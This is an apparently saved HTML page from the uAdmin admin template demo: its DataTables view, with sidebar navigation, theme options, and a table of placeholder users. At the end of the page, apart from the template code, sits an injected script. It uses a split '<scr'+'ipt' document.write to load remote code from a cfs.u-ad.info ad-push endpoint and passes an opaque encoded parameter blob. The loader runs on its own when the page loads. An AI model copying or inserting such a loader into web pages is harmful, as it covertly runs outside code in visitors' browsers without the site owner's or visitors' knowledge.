...
** A LICENSE MUST BE ACQUIRED FROM THEMEFOREST FOR LEGAL USE -> LINK: http://goo.gl/9QhXQ **
...
-->
    <meta charset="utf-8">
    <title>uAdmin - Professional, Responsive and Flat Admin Template | DEMO</title>
    <meta name="description" content="uAdmin is a Professional, Responsive and Flat Admin Template created by pixelcave and published on Themeforest. This is the demo of uAdmin! You need to purchase a license for legal use!">
...
<span class="badge badge-warning">2</span>
                    ...
                    <ul class="dropdown-menu dropdown-menu-right widget">
                        <li class="widget-heading"><a href="javascript:void(0)" class="pull-right widget-link"><i class="fa fa-cog"></i></a><a href="javascript:void(0)"
                        ...
                        <li class="widget-heading"><a href="javascript:void(0)" class="pull-right widget-link"><i class="fa fa-bookmark"></i></a>
                            <a
                                href="javascript:void(0)" class="widget-link">Project #3</a>
                        </li>
                        <li>
                            <ul>
                ...
                <li class="dropdown pull-right dropdown-user">
                    ...
                    <ul class="dropdown-menu">
                        ...
                        <li class="divider"></li>
                        <li>
                            <a href="page_datatables.php#modal-user-settings" role="button" data-toggle="modal"><i class="fa fa-user"></i> User Profile</a>
                        </li>
                        <li>
        ...
        <div id="inner-container">
            <aside id="page-sidebar" class="collapse navbar-collapse navbar-main-collapse">
                ...
                <nav id="primary-nav">
                    <ul>
                        <li>
                            <a href="index.php"><i class="fa fa-fire"></i>Dashboard</a>
                        </li>
                        <li>
                            <a href="page_ui_elements.php"><i class="fa fa-glass"></i>UI Elements</a>
                        </li>
                        <li>
                            <a href="page_typography.php"><i class="fa fa-font"></i>Typography</a>
                        </li>
                        <li>
                            <a href="page_datatables.php#"><i class="fa fa-th-list"></i>Forms</a>
                            <ul>
                                <li>
                                    <a href="page_form_components.php"><i class="fa fa-file-text"></i>Components</a>
                                </li>
                                <li>
                                    <a href="page_form_validation.php"><i class="fa fa-exclamation-triangle"></i>Validation</a>
                                </li>
                                <li>
                                    <a href="page_form_wizard.php"><i class="fa fa-magic"></i>Wizard</a>
                                </li>
                                <li>
                                    <a href="page_form_masked.php"><i class="fa fa-flask"></i>Masked Inputs</a>
                                </li>
                            </ul>
                        </li>
                        <li class="active">
                            <a href="page_datatables.php#"><i class="fa fa-table"></i>Tables</a>
                            <ul>
                                <li>
                                    <a href="page_tables.php"><i class="fa fa-tint"></i>Styles</a>
                                </li>
                                <li>
                                    <a href="page_datatables.php" class="active"><i class="fa fa-th"></i>DataTables</a>
                                </li>
                                <li>
                                    <a href="page_datatables_editable.php"><i class="fa fa-pencil"></i>Editable DataTables</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="page_datatables.php#"><i class="fa fa-leaf"></i>Components</a>
                            <ul>
                                <li>
                                    <a href="page_animations.php"><i class="fa fa-certificate animation-pulse"></i>CSS3 Animations</a>
                                </li>
                                <li>
                                    <a href="page_gallery.php"><i class="fa fa-picture-o"></i>Gallery</a>
                                </li>
                                <li>
                                    <a href="page_inbox.php"><i class="fa fa-envelope"></i>Inbox</a>
                                </li>
                                <li>
                                    <a href="page_chatui.php"><i class="fa fa-comments"></i>ChatUI</a>
                                </li>
                                <li>
                                    <a href="page_charts.php"><i class="fa fa-bar-chart-o"></i>Charts</a>
                                </li>
                                <li>
                                    <a href="page_calendar.php"><i class="fa fa-calendar"></i>Calendar</a>
                                </li>
                                <li>
                                    <a href="page_maps.php"><i class="fa fa-map-marker"></i>Maps</a>
                                </li>
                                <li>
                                    <a href="page_syntax_highlighting.php"><i class="fa fa-flask"></i>Syntax Highlighting</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="page_datatables.php#"><i class="fa fa-tint"></i>Icons</a>
                            <ul>
                                <li>
                                    <a href="page_glyphicons_pro.php"><i class="gi gi-heart"></i>Glyphicons Pro</a>
                                </li>
                                <li>
                                    <a href="page_fontawesome.php"><i class="fa fa-gift"></i>FontAwesome</a>
                                </li>
                                <li>
                                    <a href="page_gemicon.php"><i class="fa fa-smile-o"></i>Gemicon</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="page_datatables.php#"><i class="fa fa-file-o"></i>Pages</a>
                            <ul>
                                <li>
                                    <a href="page_search_results.php"><i class="fa fa-search"></i>Search Results</a>
                                </li>
                                <li>
                                    <a href="page_price_tables.php"><i class="fa fa-ticket"></i>Price Tables</a>
                                </li>
                                <li>
                                    <a href="page_forum.php"><i class="fa fa-comment"></i>Forum</a>
                                </li>
                                <li>
                                    <a href="page_article.php"><i class="fa fa-pencil"></i>Article</a>
                                </li>
                                <li>
                                    <a href="page_invoice.php"><i class="fa fa-book"></i>Invoice</a>
                                </li>
                                <li>
                                    <a href="page_profile.php"><i class="fa fa-user"></i>Profile</a>
                                </li>
                                <li>
                                    <a href="page_faq.php"><i class="fa fa-flag"></i>FAQ</a>
                                </li>
                                <li>
                                    <a href="page_errors.php"><i class="fa fa-exclamation-triangle"></i>Errors</a>
                                </li>
                                <li>
                                    <a href="page_blank.php"><i class="fa fa-circle-o"></i>Blank</a>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <a href="page_login.php"><i class="fa fa-power-off"></i>Login Page</a>
                        </li>
                        <li>
                            <a href="page_landing.php"><i class="fa fa-rocket"></i>Landing Page</a>
                        </li>
                    </ul>
                </nav>
                <div id="theme-options" class="text-left visible-md visible-lg">
                    ...
                    <div id="theme-options-content">
                        ...
                        <ul class="theme-colors clearfix">
                            <li class="active">
                                <a href="javascript:void(0)" class="themed-background-default themed-border-default" data-theme="default" data-toggle="tooltip"
                                    title="Default"></a>
                            </li>
                            <li>
                                <a href="javascript:void(0)" class="themed-background-deepblue themed-border-deepblue" data-theme="css/themes/deepblue-2.1.css"
                                    data-toggle="tooltip" title="DeepBlue"></a>
                            </li>
                            <li>
                                <a href="javascript:void(0)" class="themed-background-deepwood themed-border-deepwood" data-theme="css/themes/deepwood-2.1.css"
                                    data-toggle="tooltip" title="DeepWood"></a>
                            </li>
                            <li>
                                <a href="javascript:void(0)" class="themed-background-deeppurple themed-border-deeppurple" data-theme="css/themes/deeppurple-2.1.css"
                                    data-toggle="tooltip" title="DeepPurple"></a>
                            </li>
                            <li>
                                <a href="javascript:void(0)" class="themed-background-deepgreen themed-border-deepgreen" data-theme="css/themes/deepgreen-2.1.css"
                                    data-toggle="tooltip" title="DeepGreen"></a>
                            </li>
                        </ul>
                        <h5>Header</h5>
            ...
            <div id="page-content">
                <ul id="nav-info" class="clearfix">
                    ...
                    <li class="active"><a href="page_datatables.php">DataTables</a></li>
                </ul>
                ...
                <table id="example-datatables" class="table table-striped table-bordered table-hover">
                    ...
                    <tbody>
                        ...
                        <tr>
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user2@example.com</td>
                        ...
                        <tr>
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user3@example.com</td>
                            <td><span class="label label-info">Manual Approval</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user4@example.com</td>
                        ...
                        <tr>
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user5@example.com</td>
                        ...
                        <tr>
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user6@example.com</td>
                            <td><span class="label label-success">Approved!</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user7@example.com</td>
                            <td><span class="label label-warning">Pending..</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user8@example.com</td>
                            <td><span class="label label-success">Approved!</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user9@example.com</td>
                            <td><span class="label label-info">Manual Approval</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user10@example.com</td>
                        ...
                        <tr>
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user11@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user12@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user13@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user14@example.com</td>
                            <td><span class="label label-warning">Pending..</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user15@example.com</td>
                            <td><span class="label label-success">Approved!</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user16@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user17@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user18@example.com</td>
                            <td><span class="label label-default">Inactive</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user19@example.com</td>
                            <td><span class="label label-default">Inactive</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user20@example.com</td>
                        ...
                        <tr>
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user21@example.com</td>
                            <td><span class="label label-default">Inactive</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user22@example.com</td>
                            <td><span class="label label-success">Approved!</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user23@example.com</td>
                            <td><span class="label label-success">Approved!</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user24@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user25@example.com</td>
                            <td><span class="label label-warning">Pending..</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user26@example.com</td>
                            <td><span class="label label-danger">Unapproved</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user27@example.com</td>
                            <td><span class="label label-default">Inactive</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user28@example.com</td>
                            <td><span class="label label-inverse">Spam Account</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user29@example.com</td>
                            <td><span class="label label-default">Inactive</span></td>
                        </tr>
                        <tr>
                            <td class="text-center">
                            ...
                            <td class="hidden-xs hidden-sm hidden-md">user30@example.com</td>
                            <td><span class="label label-default">Inactive</span></td>
                        </tr>
                    </tbody>
                </table>
            ...
            <footer>
                <span id="year-copy"></span> &copy; <strong><a href="http://goo.gl/9QhXQ">uAdmin 2.1</a></strong> - Crafted
                with <i class="fa fa-heart text-danger"></i> by <strong><a href="http://goo.gl/vNS3I" target="_blank">pixelcave</a></strong>
            </footer>
        </div>
    </div>
            ...
            <div class="modal-content">
                ...
                <div class="modal-body">
                    <ul id="example-user-tabs" class="nav nav-tabs" data-toggle="tabs">
                        <li class="active"><a href="page_datatables.php#example-user-tabs-account"><i class="fa fa-cogs"></i> Account</a></li>
                        <li><a href="page_datatables.php#example-user-tabs-profile"><i class="fa fa-user"></i> Profile</a></li>
                    </ul>
...
<option>Female</option>
    ...
    <script>
        $(function () {
            ...
            }), $("#example-datatables2").dataTable(), $("#example-datatables3").dataTable(), $(
    ...
    <script type="text/javascript">
        if (self == top) {
            ...
            document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url +
                "cfs.u-ad.info/cfspushadsv2/request");
            document.write("?id=1");
            document.write("&amp;enc=telkom2");
            document.write("&amp;params=" +
                "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRODYzIZYChyPFnqNlwMRzjnzS8z3sNVKDKxtroOUMycZtsyGexppj1JYUA49z4piA45WVw6tw%2fcPfk0pjMKP9bmuTz0nJ4jJL4V%2fEbzRfA24yljZ8hrXYrGNntQSEuM1Z%2bthj%2f6qRkBZaHKgdDY0RDTBux3HRz5ARKNoCQhNdXqHr6aJ0IsluLPdMHKBNslC8jyJW5tT2tc7%2bwaBfAWSR0DmhvckX5JjP1DkS6xuIjZ5Y%2bv5MQjIaGCVE8lhdNrOGWbo011tlfIzGHukOcZIswBK9kHZFukrLsuC1Xcq%2fsmDsAZRzPdOZwdWWQgtj2Qxqw72PScO6sMXLBcoXLpa9JLwKLEzvv4NALFqW5JYeRU6uaZL3Yl%2fns%2bm0yRm7o%2blaDiIESM2%2b4saJif4vCnhPCLrx%2bxBFUW7TO7p6qi0fhnDG9wrgTS%2fAOQ%3d%3d"
            );
